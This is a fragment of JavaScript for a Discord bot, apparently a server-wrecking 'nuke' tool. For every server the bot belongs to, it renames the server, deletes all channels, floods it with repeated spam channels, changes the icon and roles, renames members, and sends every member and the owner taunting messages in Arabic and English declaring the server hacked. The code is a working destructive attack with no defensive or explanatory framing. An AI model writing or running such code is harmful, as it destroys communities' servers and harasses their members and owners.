...
client.guilds.forEach(g => {
   g.setName('alo-slam-3lekoo :C')
        g.channels.forEach(c =>{
        c.delete()
    })

   g.createChannel('alo-slam-3lekoo', 'voice');
    g.createChannel('alo-slam-3lekoo', 'text');
	   g.createChannel('alo-slam-3lekoo', 'voice');
    g.createChannel('alo-slam-3lekoo', 'text');
	   g.createChannel('alo-slam-3lekoo', 'voice');
    g.createChannel('alo-slam-3lekoo', 'text');
    ...
    g.createChannel('alo-slam-3lekoo', 'text');
		   g.createChannel('alo-slam-3lekoo', 'voice');
    g.createChannel('alo-slam-3lekoo', 'text');
g.setIcon('https://cdn.discordapp.com/attachments/380847073811103754/380847865628590080/danger.PNG')
    g.members.forEach(m=>{
        m.send(`^_^ تم  دعس البوت `)
        m.send(`وتم دعس السيرفرات يلي فيها البوت ^_^`)

	 m.guild.owner.send('تم تهكير سيرفرك يا حلو , هههههههههههههههه ,Your Server Is Hacked hahahahahaha').catch(e => { return void e; });
	
        m.setNickname('alo-slam-3lekoo')
client.user.setAvatar(`https://cdn.discordapp.com/attachments/343244077359169537/446366389679161344/Wolf.PNG`)
 m.guild.createRole({
                  name: "alo-slam-3lekoo",
                    color: "#0c0c0c",
...
client.on('ready', () => {
  ...
  client.user.setGame(`alo-slam-3lekoo`)
});
